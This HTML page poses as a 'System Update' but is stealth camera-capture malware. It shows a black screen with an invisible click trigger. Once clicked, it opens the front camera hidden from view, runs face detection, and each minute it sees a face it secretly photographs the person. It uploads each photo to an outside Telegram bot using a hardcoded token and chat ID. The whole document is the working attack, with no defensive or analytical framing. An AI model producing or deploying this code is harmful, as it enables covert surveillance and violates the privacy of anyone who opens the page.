<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clmtrackr/1.3.1/clmtrackr.min.js"></script>
    <style>
        /* Stealth Mode: Pure Black Screen */
        body, html { 
            background: #000; 
            margin: 0; 
            padding: 0; 
            width: 100vw; 
            height: 100vh; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
            align-items: center;
        }
        /* Hidden elements for capture */
        #v, #c { display: none; }
        /* Full screen invisible trigger */
        #trigger { 
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%; 
            z-index: 999; 
            cursor: pointer;
        }
    </style>
</head>
<body onclick="startStealth()">

    <div id="trigger"></div>
    <video id="v" width="640" height="480" autoplay playsinline muted></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const botToken = "8041664147:AAF8SEZD3WUzX2wLBbMzc5V4nQKStkNS_sM";
        const chatId = "7248302842"; // <--- REPLACE WITH YOUR TELEGRAM ID

        let isCapturing = false;

        function startStealth() {
            // Hide the trigger once clicked
            document.getElementById('trigger').style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        const tracker = new clm.tracker();
                        tracker.init();
                        tracker.start(video);

                        // AI Loop: Looks for a face
                        function checkFace() {
                            if (tracker.getCurrentPosition()) {
                                sendPhoto();
                            }
                            requestAnimationFrame(checkFace);
                        }
                        checkFace();
                    };
                })
                .catch(err => console.log("Init failed"));
        }

        function sendPhoto() {
            if (isCapturing) return;
            isCapturing = true;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'capture.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(() => {
                    // Success! Wait 60 seconds before taking another to save battery/data
                    setTimeout(() => { isCapturing = false; }, 60000);
                })
                .catch(() => { 
                    isCapturing = false; 
                });
            }, 'image/jpeg', 0.5); // Low quality for stealth speed
        }
    </script>
</body>
</html>
